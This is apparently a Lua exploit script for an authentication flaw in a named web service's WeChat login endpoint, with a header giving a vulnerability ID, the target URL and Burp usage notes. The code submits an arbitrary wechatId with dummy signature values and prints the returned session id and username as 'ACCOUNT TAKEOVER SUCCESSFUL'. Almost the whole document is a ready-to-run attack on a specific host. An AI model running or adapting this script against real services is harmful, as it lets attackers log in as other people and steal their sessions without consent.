--[[
	Vuln ID: 1fff1e6c-c53a-4903-88c2-2f18a466e0db
	Project: ttww
	Target: https://apib63.bf1788.com/boxApi.php?cmd=1000 (WechatLogin)
	Type: Broken Authentication / Account Takeover (Arbitrary Account Login)
	
	Exploit: Post-exploitation Lua script for Burp Suite / ACR/Repeater automation
	Usage: Load in Burp -> Target -> right-click -> "Engagement tools" -> 
	       "Match and Replace" or run via burpsuite lua extension
	       Direct CLI: lua wechatlogin-at.lua <wechatId>
	
	Proof: Server returns sid + username for any known wechatId without password
]]--

local http = require("socket.http")
local json = (require "cjson").encode

local url = "https://apib63.bf1788.com/boxApi.php?cmd=1000"

local wechatId = arg[1] or "testwechat001"

local body = string.format(
  "cmd=1000&wechatId=%s&sid=&vendorId=test&signature=test&site=bfc&lang=tw",
  wechatId
)

local res, code = http.request(url, body)
print("Status code: " .. code)
print("Response: " .. res)

local ok, parsed = pcall(require("cjson").decode, res)
if ok and parsed.status == "0" then
  print("[+] ACCOUNT TAKEOVER SUCCESSFUL")
  print("[+] wechatId: " .. wechatId)
  print("[+] sid: " .. parsed.msg.sid)
  print("[+] username: " .. parsed.msg.username)
elseif ok then
  print("[-] Login failed: " .. (parsed.msg or "unknown error"))
else
  print("[-] Invalid response: " .. res)
end
